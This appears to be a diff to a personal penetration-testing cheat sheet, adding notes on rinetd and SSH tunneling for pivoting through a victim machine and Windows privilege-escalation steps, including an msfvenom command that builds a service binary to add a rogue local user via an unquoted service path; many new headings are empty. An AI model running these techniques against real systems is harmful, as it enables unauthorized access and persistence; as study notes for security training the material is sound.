@@ -292,6 +292,34 @@ Use /etc/passwd and /etc/shadow
 
 ## Tunneling and Port Forwarding
 
+### Port Forwarding/Redirection
+`apt-get install rinetd`
+
+`nano /etc/rinetd.conf` - add bindaddress bindport connectaddress connectport (middle man)
+
+configures machine to forward traffice from bindaddress and bindport to connect address and connectport
+
+
+### SSH Tunneling
+
+#### Local Port Forwarding
+
+`ssh [middleip] -p [middleport] [locallistenport]:[connectaddress]:[connect port]`
+
+we can now listen on port 8080 for incoming traffice from connect address on localhost
+
+
+#### Remote Port Forwarding
+opens up ports on victim machine that are closed off from attacking machine (say we want to rdp)
+`ssh [attacking machine] -p [attacking port] -R [port to tunnel to on attacking machine]:127.0.0.1:[port service is running on]` now attacker just connects to localhost on their assigned port
+
+
+#### Dyanmic Port Forwarding
+Where we set up local machine to forward traffice to any remote destination through a proxy
+`ssh -D [local proxy port] -p [remote port] [target ip]`
+
+
+
 ## Local Privilege Escalation
 
 ### Rescources
@@ -313,11 +341,16 @@ Exploit Suggester scripts(kernel)
 
 ### Windows
 
-#### Services
+#### System info
+
+#### Scripts
+
+#### Services(DLL, binpath, registry, exe)
 `accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in users group
 `accesschk64.exe -wuvc [service]` - checks permissions on service 
 Example had you look for SERVICE_CHANGE_CONFIG to be writeable so we could change binpath
 
+#### Unqouted Paths
 
 `wmic service get name,pathname,startmode` - find unquoted file paths for services
 `msfvenom -p windows/exec CMD='net user /add qoute qoute123' -f exe-service -o common.exe` - creates binary to run in unquoted path, name of binary must be in path for this to work. then restart service
@@ -325,7 +358,55 @@ Example had you look for SERVICE_CHANGE_CONFIG to be writeable so we could chang
 #### Autorun
 We're looking for execeutables that are automaticaly executed on some event (logon tab for autorun). Hopefully one of these executables has had poor misconfigurations for permissionsC
 
+
+#### Cleartext or b64 passwords
+
+
+#### Pass the hash
+
+
+#### Services only avalailable from loopback
+
+
+#### Scheduled Tasks
+
+
+#### AlwaysInstallElevated
+
+
+#### Kernel Exploits
+
+#### Useful commands
+
+#### Metasploit Modules
+
+#### WMIC
+
+
+
 ### Linux
+
+#### Scripts
+
+#### Programs running as root
+
+#### Passwords
+
+#### Loopback services
+
+#### Suid and Guid
+
+#### SUdo
+
+#### Perms
+
+#### bad path
+
+#### Cron
+
+#### Unmounted filesystems
+
+#### NFS Share
 
 ## Buffer Overflow
 
